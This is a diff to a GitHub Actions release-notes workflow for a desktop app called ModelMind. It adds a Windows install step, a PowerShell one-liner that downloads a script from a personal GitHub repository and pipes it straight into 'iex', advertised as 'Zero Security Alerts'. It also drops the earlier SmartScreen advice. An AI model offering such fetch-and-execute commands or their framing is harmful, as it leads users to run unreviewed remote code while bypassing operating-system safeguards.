@@ -123,8 +123,14 @@ jobs:
           ---
 
           ### 🪟 Windows (64-bit)
-          - **EXE**: `ModelMind-Setup-Windows-x64.exe`
-          - If SmartScreen appears, click **More info → Run anyway**.
+          - **EXE Download**: `ModelMind-Setup-Windows-x64.exe`
+          - Double-click to install. It installs to your user profile and creates a Desktop shortcut.
+
+          #### ⚡ 1-Line Fast Install (PowerShell — Zero Security Alerts)
+          Open Windows PowerShell and run this single line (no administrator permissions required):
+          ```powershell
+          irm https://raw.githubusercontent.com/harshitsachan830-dev/Backup2/main/scripts/install-windows.ps1 | iex
+          ```
 
           ---
 
